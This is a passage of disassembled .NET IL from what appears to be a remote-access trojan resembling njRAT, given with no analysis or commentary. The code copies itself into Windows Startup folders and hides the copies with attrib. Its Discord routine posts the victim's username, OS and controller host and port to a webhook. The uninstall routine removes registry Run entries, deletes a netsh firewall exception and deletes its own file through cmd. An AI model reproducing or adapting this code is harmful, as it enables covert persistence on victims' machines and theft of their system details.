    IL_0258:  ldsfld     bool L::IsF
    IL_025d:  brfalse    IL_0323

    .try
    {
      IL_0262:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
      IL_0267:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_026c:  ldc.i4.7
      IL_026d:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0272:  ldstr      "\\"
      IL_0277:  ldsfld     string L::RG
      IL_027c:  ldstr      ".exe"
      IL_0281:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0286:  ldc.i4.1
      IL_0287:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_028c:  ldc.i4.7
      IL_028d:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0292:  ldstr      "\\"
      IL_0297:  ldsfld     string L::RG
      IL_029c:  ldstr      ".exe"
      IL_02a1:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02a6:  ldc.i4.3
      IL_02a7:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_02ac:  stsfld     class [mscorlib]System.IO.FileStream L::FS
      IL_02b1:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
      IL_02b6:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_02bb:  ldc.i4.s   21
      IL_02bd:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02c2:  ldstr      "\\"
      IL_02c7:  ldsfld     string L::RG
      IL_02cc:  ldstr      ".exe"
      IL_02d1:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02d6:  ldc.i4.1
      IL_02d7:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_02dc:  ldc.i4.s   21
      IL_02de:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02e3:  ldstr      "\\"
      IL_02e8:  ldsfld     string L::RG
      IL_02ed:  ldstr      ".exe"
      IL_02f2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02f7:  ldc.i4.3
      IL_02f8:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_02fd:  stsfld     class [mscorlib]System.IO.FileStream L::FS
      IL_0302:  leave.s    IL_0323

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0304:  dup
      IL_0305:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_030a:  stloc.s    V_10
      IL_030c:  ldloc.s    V_10
      IL_030e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0313:  ldloc.s    V_10
      IL_0315:  stloc.s    V_11
      IL_0317:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_031c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0321:  leave.s    IL_0323

    }  // end handler
    IL_0323:  ldsfld     bool L::att
    IL_0328:  brfalse.s  IL_0350

    .try
    {
      IL_032a:  call       void L::Del()
      IL_032f:  leave.s    IL_0350

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0331:  dup
      IL_0332:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0337:  stloc.s    V_12
      IL_0339:  ldloc.s    V_12
      IL_033b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0340:  ldloc.s    V_12
      IL_0342:  stloc.s    V_13
      IL_0344:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0349:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_034e:  leave.s    IL_0350

    }  // end handler
    IL_0350:  ldsfld     bool L::DIC
    IL_0355:  brfalse.s  IL_037d

    .try
    {
      IL_0357:  call       void L::Discord()
      IL_035c:  leave.s    IL_037d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_035e:  dup
      IL_035f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0364:  stloc.s    V_14
      IL_0366:  ldloc.s    V_14
      IL_0368:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_036d:  ldloc.s    V_14
      IL_036f:  stloc.s    V_15
      IL_0371:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0376:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_037b:  leave.s    IL_037d

    }  // end handler
    IL_037d:  ret
  } // end of method L::INS

  .method public static void  Discord() cil managed
  {
    // 
    .maxstack  9
    .locals init (object V_0,
             object V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             string[] V_4,
             object[] V_5,
             object[] V_6,
             bool[] V_7)
    .try
    {
      IL_0000:  ldsfld     string L::DS
      IL_0005:  stloc.2
      IL_0006:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_000b:  stloc.1
      IL_000c:  newobj     instance void [System]System.Collections.Specialized.NameValueCollection::.ctor()
      IL_0011:  stloc.0
      IL_0012:  ldloc.0
      IL_0013:  ldc.i4.2
      IL_0014:  newarr     [mscorlib]System.Object
      IL_0019:  stloc.s    V_5
      IL_001b:  ldloc.s    V_5
      IL_001d:  ldc.i4.0
      IL_001e:  ldstr      "content"
      IL_0023:  stelem.ref
      IL_0024:  ldloc.s    V_5
      IL_0026:  ldc.i4.1
      IL_0027:  ldc.i4.8
      IL_0028:  newarr     [mscorlib]System.String
      IL_002d:  stloc.s    V_4
      IL_002f:  ldloc.s    V_4
      IL_0031:  ldc.i4.0
      IL_0032:  ldstr      "You have a running computer...\r\ninformation ------"
      + "------------------------\r\n[+] Name   : "
      IL_0037:  stelem.ref
      IL_0038:  ldloc.s    V_4
      IL_003a:  ldc.i4.1
      IL_003b:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0040:  stelem.ref
      IL_0041:  ldloc.s    V_4
      IL_0043:  ldc.i4.2
      IL_0044:  ldstr      "\r\n[+] System : "
      IL_0049:  stelem.ref
      IL_004a:  ldloc.s    V_4
      IL_004c:  ldc.i4.3
      IL_004d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
      IL_0052:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_0057:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_005c:  stelem.ref
      IL_005d:  ldloc.s    V_4
      IL_005f:  ldc.i4.4
      IL_0060:  ldstr      "\r\n[+] Host   : "
      IL_0065:  stelem.ref
      IL_0066:  ldloc.s    V_4
      IL_0068:  ldc.i4.5
      IL_0069:  ldsfld     string L::H
      IL_006e:  stelem.ref
      IL_006f:  ldloc.s    V_4
      IL_0071:  ldc.i4.6
      IL_0072:  ldstr      "\r\n[+] Port   : "
      IL_0077:  stelem.ref
      IL_0078:  ldloc.s    V_4
      IL_007a:  ldc.i4.7
      IL_007b:  ldsfld     string L::P
      IL_0080:  stelem.ref
      IL_0081:  ldloc.s    V_4
      IL_0083:  call       string [mscorlib]System.String::Concat(string[])
      IL_0088:  stelem.ref
      IL_0089:  ldloc.s    V_5
      IL_008b:  ldnull
      IL_008c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexSet(object,
                                                                                                                           object[],
                                                                                                                           string[])
      IL_0091:  ldloc.1
      IL_0092:  ldnull
      IL_0093:  ldstr      "UploadValues"
      IL_0098:  ldc.i4.2
      IL_0099:  newarr     [mscorlib]System.Object
      IL_009e:  stloc.s    V_5
      IL_00a0:  ldloc.s    V_5
      IL_00a2:  ldc.i4.0
      IL_00a3:  ldloc.2
      IL_00a4:  stelem.ref
      IL_00a5:  ldloc.s    V_5
      IL_00a7:  ldc.i4.1
      IL_00a8:  ldloc.0
      IL_00a9:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00ae:  stelem.ref
      IL_00af:  ldloc.s    V_5
      IL_00b1:  stloc.s    V_6
      IL_00b3:  ldloc.s    V_6
      IL_00b5:  ldnull
      IL_00b6:  ldnull
      IL_00b7:  ldc.i4.2
      IL_00b8:  newarr     [mscorlib]System.Boolean
      IL_00bd:  stloc.s    V_7
      IL_00bf:  ldloc.s    V_7
      IL_00c1:  ldc.i4.0
      IL_00c2:  ldc.i4.1
      IL_00c3:  stelem.i1
      IL_00c4:  ldloc.s    V_7
      IL_00c6:  ldc.i4.1
      IL_00c7:  ldc.i4.1
      IL_00c8:  stelem.i1
      IL_00c9:  ldloc.s    V_7
      IL_00cb:  ldc.i4.1
      IL_00cc:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_00d1:  pop
      IL_00d2:  ldloc.s    V_7
      IL_00d4:  ldc.i4.0
      IL_00d5:  ldelem.i1
      IL_00d6:  brfalse.s  IL_00f6

      IL_00d8:  ldloc.s    V_6
      IL_00da:  ldc.i4.0
      IL_00db:  ldelem.ref
      IL_00dc:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00e1:  ldtoken    [mscorlib]System.String
      IL_00e6:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_00eb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_00f0:  castclass  [mscorlib]System.String
      IL_00f5:  stloc.2
      IL_00f6:  ldloc.s    V_7
      IL_00f8:  ldc.i4.1
      IL_00f9:  ldelem.i1
      IL_00fa:  brfalse.s  IL_0106

      IL_00fc:  ldloc.s    V_6
      IL_00fe:  ldc.i4.1
      IL_00ff:  ldelem.ref
      IL_0100:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0105:  stloc.0
      IL_0106:  leave.s    IL_0116

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0108:  dup
      IL_0109:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_010e:  stloc.3
      IL_010f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0114:  leave.s    IL_0116

    }  // end handler
    IL_0116:  ret
  } // end of method L::Discord

  .method public static void  Del() cil managed
  {
    // 
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0,
             string[] V_1)
    IL_0000:  ldsfld     bool L::att
    IL_0005:  brfalse.s  IL_0073

    .try
    {
      IL_0007:  ldc.i4.5
      IL_0008:  newarr     [mscorlib]System.String
      IL_000d:  stloc.1
      IL_000e:  ldloc.1
      IL_000f:  ldc.i4.0
      IL_0010:  ldstr      "attrib +h +r +s \""
      IL_0015:  stelem.ref
      IL_0016:  ldloc.1
      IL_0017:  ldc.i4.1
      IL_0018:  ldc.i4.7
      IL_0019:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_001e:  stelem.ref
      IL_001f:  ldloc.1
      IL_0020:  ldc.i4.2
      IL_0021:  ldstr      "\\"
      IL_0026:  stelem.ref
      IL_0027:  ldloc.1
      IL_0028:  ldc.i4.3
      IL_0029:  ldsfld     string L::RG
      IL_002e:  stelem.ref
      IL_002f:  ldloc.1
      IL_0030:  ldc.i4.4
      IL_0031:  ldstr      ".exe\""
      IL_0036:  stelem.ref
      IL_0037:  ldloc.1
      IL_0038:  call       string [mscorlib]System.String::Concat(string[])
      IL_003d:  ldc.i4.0
      IL_003e:  ldc.i4.0
      IL_003f:  ldc.i4.m1
      IL_0040:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0045:  pop
      IL_0046:  ldstr      "attrib +h +r +s \""
      IL_004b:  ldsfld     string L::LIH
      IL_0050:  ldstr      "\""
      IL_0055:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005a:  ldc.i4.0
      IL_005b:  ldc.i4.0
      IL_005c:  ldc.i4.m1
      IL_005d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0062:  pop
      IL_0063:  leave.s    IL_0073

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0065:  dup
      IL_0066:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006b:  stloc.0
      IL_006c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0071:  leave.s    IL_0073

    }  // end handler
    IL_0073:  ret
  } // end of method L::Del

  .method public static void  UNS() cil managed noinlining nooptimization
  {
    // 
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11)
    IL_0000:  ldc.i4.0
    IL_0001:  call       void L::pr(int32)
    IL_0006:  ldc.i4.0
    IL_0007:  stsfld     bool L::Isu
    .try
    {
      IL_000c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
      IL_0011:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0016:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_001b:  ldsfld     string L::sf
      IL_0020:  ldc.i4.1
      IL_0021:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0026:  ldsfld     string L::RG
      IL_002b:  ldc.i4.0
      IL_002c:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0031:  leave.s    IL_004e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0033:  dup
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0039:  stloc.0
      IL_003a:  ldloc.0
      IL_003b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0040:  ldloc.0
      IL_0041:  stloc.1
      IL_0042:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004c:  leave.s    IL_004e

    }  // end handler
    .try
    {
      IL_004e:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
      IL_0053:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0058:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_005d:  ldsfld     string L::sf
      IL_0062:  ldc.i4.1
      IL_0063:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0068:  ldsfld     string L::RG
      IL_006d:  ldc.i4.0
      IL_006e:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0073:  leave.s    IL_0090

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0075:  dup
      IL_0076:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_007b:  stloc.3
      IL_007c:  ldloc.3
      IL_007d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0082:  ldloc.3
      IL_0083:  stloc.2
      IL_0084:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0089:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_008e:  leave.s    IL_0090

    }  // end handler
    .try
    {
      IL_0090:  ldstr      "netsh firewall delete allowedprogram \""
      IL_0095:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
      IL_009a:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_009f:  ldstr      "\""
      IL_00a4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a9:  ldc.i4.0
      IL_00aa:  ldc.i4.0
      IL_00ab:  ldc.i4.m1
      IL_00ac:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_00b1:  pop
      IL_00b2:  leave.s    IL_00d3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b4:  dup
      IL_00b5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ba:  stloc.s    V_5
      IL_00bc:  ldloc.s    V_5
      IL_00be:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c3:  ldloc.s    V_5
      IL_00c5:  stloc.s    V_4
      IL_00c7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d1:  leave.s    IL_00d3

    }  // end handler
    .try
    {
      IL_00d3:  ldsfld     class [mscorlib]System.IO.FileStream L::FS
      IL_00d8:  brfalse.s  IL_0103

      IL_00da:  ldsfld     class [mscorlib]System.IO.FileStream L::FS
      IL_00df:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_00e4:  ldc.i4.7
      IL_00e5:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_00ea:  ldstr      "\\"
      IL_00ef:  ldsfld     string L::RG
      IL_00f4:  ldstr      ".exe"
      IL_00f9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_00fe:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0103:  leave.s    IL_0124

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0105:  dup
      IL_0106:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_010b:  stloc.s    V_7
      IL_010d:  ldloc.s    V_7
      IL_010f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0114:  ldloc.s    V_7
      IL_0116:  stloc.s    V_6
      IL_0118:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0122:  leave.s    IL_0124

    }  // end handler
    .try
    {
      IL_0124:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
      IL_0129:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_012e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0133:  ldstr      "Software"
      IL_0138:  ldc.i4.1
      IL_0139:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_013e:  ldsfld     string L::RG
      IL_0143:  ldc.i4.0
      IL_0144:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_0149:  leave.s    IL_016a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_014b:  dup
      IL_014c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0151:  stloc.s    V_8
      IL_0153:  ldloc.s    V_8
      IL_0155:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_015a:  ldloc.s    V_8
      IL_015c:  stloc.s    V_9
      IL_015e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0163:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0168:  leave.s    IL_016a

    }  // end handler
    .try
    {
      IL_016a:  ldstr      "cmd.exe /c ping 0 -n 2 & del \""
      IL_016f:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
      IL_0174:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0179:  ldstr      "\""
      IL_017e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0183:  ldc.i4.0
      IL_0184:  ldc.i4.0
      IL_0185:  ldc.i4.m1
      IL_0186:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_018b:  pop
      IL_018c:  leave.s    IL_01ad

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_018e:  dup
      IL_018f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0194:  stloc.s    V_10
      IL_0196:  ldloc.s    V_10
      IL_0198:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_019d:  ldloc.s    V_10
      IL_019f:  stloc.s    V_11
      IL_01a1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01a6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01ab:  leave.s    IL_01ad

    }  // end handler
    IL_01ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01b2:  ret
  } // end of method L::UNS

  .method public static uint8[]  ZIP(uint8[] B) cil managed
  {
    // 
    .maxstack  4
    .locals init (uint8[] V_0,
             uint8[] V_1,
             int32 V_2,
             class [System]System.IO.Compression.GZipStream V_3,
             class [mscorlib]System.IO.MemoryStream V_4,
             uint8[] V_5)
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0006:  stloc.s    V_4
    IL_0008:  ldloc.s    V_4
    IL_000a:  ldc.i4.0
    IL_000b:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_0010:  stloc.3
    IL_0011:  ldc.i4.4
    IL_0012:  newarr     [mscorlib]System.Byte
    IL_0017:  stloc.1
    IL_0018:  ldloc.s    V_4
    IL_001a:  ldloc.s    V_4
    IL_001c:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_0021:  ldc.i4.5
    IL_0022:  conv.i8
    IL_0023:  sub.ovf
    IL_0024:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0029:  ldloc.s    V_4
    IL_002b:  ldloc.1
    IL_002c:  ldc.i4.0
    IL_002d:  ldc.i4.4
    IL_002e:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0033:  pop
    IL_0034:  ldloc.1
    IL_0035:  ldc.i4.0
    IL_0036:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_003b:  stloc.2
    IL_003c:  ldloc.s    V_4
    IL_003e:  ldc.i4.0
    IL_003f:  conv.i8
    IL_0040:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0045:  ldloc.2
    IL_0046:  ldc.i4.1
    IL_0047:  sub.ovf
    IL_0048:  ldc.i4.1
    IL_0049:  add.ovf
    IL_004a:  ldc.i4.1
    IL_004b:  sub.ovf
    IL_004c:  ldc.i4.1
    IL_004d:  add.ovf
    IL_004e:  newarr     [mscorlib]System.Byte
    IL_0053:  stloc.0
    IL_0054:  ldloc.3
    IL_0055:  ldloc.0
    IL_0056:  ldc.i4.0
    IL_0057:  ldloc.2
    IL_0058:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_005d:  pop
    IL_005e:  ldloc.3
    IL_005f:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0064:  ldloc.s    V_4
    IL_0066:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_006b:  ldloc.0
    IL_006c:  ret
  } // end of method L::ZIP

} // end of class L


// =============================================================

// 
// 
